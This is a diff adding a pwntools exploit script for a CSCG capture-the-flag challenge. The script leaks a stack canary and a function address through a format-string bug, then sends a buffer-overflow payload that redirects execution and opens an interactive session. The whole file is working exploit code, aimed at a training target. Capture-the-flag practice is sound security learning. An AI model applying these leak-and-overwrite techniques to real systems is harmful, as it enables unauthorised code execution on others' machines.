@@ -1,0 +1,20 @@
+from pwn import *
+
+#io = process('./pwn2_test')
+io = remote('7b0000005e6ee5fcd2febbe2-intro-pwn-2.challenge.broker.cscg.live', 31337, ssl=True)
+print(io.recv())
+io.sendline('CSCG{FLAG_FROM_STAGE_1}')
+print(io.recv())
+io.sendline('%39$p %41$p')
+print(io.recvuntil('\xe2\x94\x98\n'))
+a = io.recv()
+canary = int(a.split()[0],16)
+win = int(a.split()[1],16)-591
+print('canary: ', hex(canary))
+print('win:    ', hex(win))
+print('main:   ', hex(win-591))
+payload = b'Expelliarmus\0'+b'\0'*(264-len(b'Expelliarmus\0'))+p64(canary)+p64(win+0x36)+p64(win)
+#+p64(win)
+print('magic spell: ')
+io.sendline(payload)
+io.interactive()
